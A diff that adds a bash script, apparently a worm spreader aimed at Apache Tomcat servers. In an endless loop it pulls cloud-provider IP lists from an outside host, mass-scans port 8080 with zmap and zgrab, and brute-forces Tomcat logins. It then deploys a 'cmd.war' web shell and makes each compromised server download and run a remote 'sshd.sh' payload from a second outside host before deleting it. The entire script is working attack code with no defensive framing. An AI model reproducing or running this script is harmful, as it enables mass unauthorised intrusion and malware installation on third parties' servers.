@@ -1,0 +1,52 @@
+#!/bin/bash
+for (( ; ; ))
+do
+if ls *.zone &>/dev/null
+then
+    echo "Found."
+else
+wget newagekingdom.theworkpc.com:8281/lists/amazon1.zone
+wget newagekingdom.theworkpc.com:8281/lists/amazon2.zone
+wget newagekingdom.theworkpc.com:8281/lists/amazon3.zone
+wget newagekingdom.theworkpc.com:8281/lists/azure.zone
+wget newagekingdom.theworkpc.com:8281/lists/digital.zone
+wget newagekingdom.theworkpc.com:8281/lists/google.zone
+wget newagekingdom.theworkpc.com:8281/lists/hetzner.zone
+wget newagekingdom.theworkpc.com:8281/lists/oracle.zone
+wget newagekingdom.theworkpc.com:8281/lists/ovh.zone
+wget newagekingdom.theworkpc.com:8281/lists/softlayer.zone
+fi
+        rm -rf ok.csv result.txt tom.txt tom2.txt file.txt done1.txt supra.txt up.txt l
+	for i in *.zone
+        do zmap -p 8080 -w $i -o file.txt -i eth0 -B10M
+	pkill -9 zmap
+        rm -rf $i
+        zgrab --port 8080 --input-file file.txt --data my_req --output-file ok.csv
+	pkill -9 zgrab
+	rm -rf file.txt
+        cat ok.csv | grep "Tomcat" | grep "401" >> l
+        tr '"' ' ' < l > supra.txt
+        rm -rf l ok.csv
+        awk '{ print $4 }' supra.txt >> done1.txt
+	python w00t3r.py -h done1.txt -p 8080 -m 50 -t 10
+	awk '{ print $2 }' result.txt >> tom.txt
+	rm -rf result.txt done1.txt supra.txt
+while read -r line
+do
+timeout 60 python tomcatWarDeployer.py $line -f cmd.war
+	done < tom.txt
+	tr '/' ' ' < tom.txt > tom2.txt
+	awk '{ print "http://"$2"/jsp_app/cmd.jsp" }' tom2.txt >> up.txt
+	rm -rf tom.txt tom2.txt
+	while read -r lineup
+	do
+	timeout 30 curl --data 'cmd=curl http://ionage.theworkpc.com:8088/sshd.sh -o /var/tmp/juliuscaesar.sh' $lineup
+	timeout 30 curl --data 'cmd=wget http://ionage.theworkpc.com:8088/sshd.sh -O /var/tmp/juliuscaesar.sh' $lineup
+	timeout 30 curl --data 'cmd=chmod 777 /var/tmp/juliuscaesar.sh' $lineup
+	timeout 30 curl --data 'cmd=sh /var/tmp/juliuscaesar.sh' $lineup
+	timeout 30 curl --data 'cmd=rm -rf /var/tmp/juliuscaesar.sh' $lineup
+	timeout 30 curl --data 'cmd=rm -rf /var/tmp/juliuscaesar.sh.1' $lineup
+	done < up.txt
+	rm -rf up.txt
+done
+done
